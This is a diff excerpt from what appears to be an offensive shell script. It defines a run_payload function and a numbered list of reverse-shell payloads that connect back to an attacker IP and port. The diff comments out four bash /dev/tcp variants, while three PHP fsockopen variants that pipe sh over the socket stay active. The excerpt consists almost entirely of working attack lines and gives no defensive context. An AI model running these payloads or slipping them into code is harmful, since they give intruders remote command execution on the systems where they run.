@@ -34,10 +34,10 @@ run_payload() {
 }
 
 # Payloads
-PAYLOAD_1="bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1"
-PAYLOAD_2="exec 5<>/dev/tcp/$ATTACKER_IP/$PORT; cat <&5 | while read line; do \$line 2>&5 >&5; done"
-PAYLOAD_3="0<&196;exec 196<>/dev/tcp/$ATTACKER_IP/$PORT; sh <&196 >&196 2>&196"
-PAYLOAD_4="bash -i 5<> /dev/tcp/ATTACKER_IP/$PORT 0<&5 1>&5 2>&5"
+#PAYLOAD_1="bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1"
+#PAYLOAD_2="exec 5<>/dev/tcp/$ATTACKER_IP/$PORT; cat <&5 | while read line; do \$line 2>&5 >&5; done"
+#PAYLOAD_3="0<&196;exec 196<>/dev/tcp/$ATTACKER_IP/$PORT; sh <&196 >&196 2>&196"
+#PAYLOAD_4="bash -i 5<> /dev/tcp/ATTACKER_IP/$PORT 0<&5 1>&5 2>&5"
 PAYLOAD_5="php -r '$sock=fsockopen(\"$ATTACKER_IP\",$PORT);exec(\"sh <&3 >&3 2>&3\");'"
 PAYLOAD_6="php -r '$sock=fsockopen(\"$ATTACKER_IP\",$PORT);shell_exec(\"sh <&3 >&3 2>&3\");'"
 PAYLOAD_7="php -r '$sock=fsockopen(\"$ATTACKER_IP\",$PORT);system(\"sh <&3 >&3 2>&3\");'"
